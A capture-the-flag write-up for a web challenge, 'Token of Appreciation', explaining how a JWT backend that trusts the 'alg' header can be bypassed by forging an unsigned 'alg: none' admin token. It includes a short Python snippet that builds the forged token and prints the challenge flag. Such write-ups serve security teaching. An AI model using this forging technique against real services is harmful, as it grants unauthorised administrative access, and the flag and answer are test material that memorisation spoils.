---
title: Token of Appreciation
category: Web
points: 375
difficulty: 3
flag: HTB{alg_n0ne_str1kes_ag41n}
solves: 588
tags: [web, jwt, auth-bypass]
author: Radiant Blaze
description: The API verifies JWTs but trusts the alg header. Switch it to none and forge an admin token.
---
## Recon

Logging in returns a JSON Web Token that the client sends on every request. The payload is readable and clearly role-gated:

```json
{ "user": "guest", "role": "user" }
```

Changing `role` to `admin` naively breaks the signature — the server rejects it. So the signature *is* checked. The question is how.

## The Flaw

JWT headers declare which algorithm to verify with. A permissive backend reads that header and obeys it, including the infamous `none` algorithm, which means "no signature at all":

```json
{ "alg": "none", "typ": "JWT" }
```

If the server honours `alg: none`, it will accept an unsigned token as authentic.

> The header is attacker-controlled. Letting it *choose* the verification algorithm hands the client the keys to the lock.

## Forging

Build a token with `alg: none`, the admin payload, and an empty signature (the trailing dot stays):

```python
import base64, json
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=")
head = b64({"alg": "none", "typ": "JWT"})
body = b64({"user": "guest", "role": "admin"})
token = head + b"." + body + b"."
```

Send it as the bearer token and the admin route returns the flag.

## Flag

```
HTB{alg_n0ne_str1kes_ag41n}
```
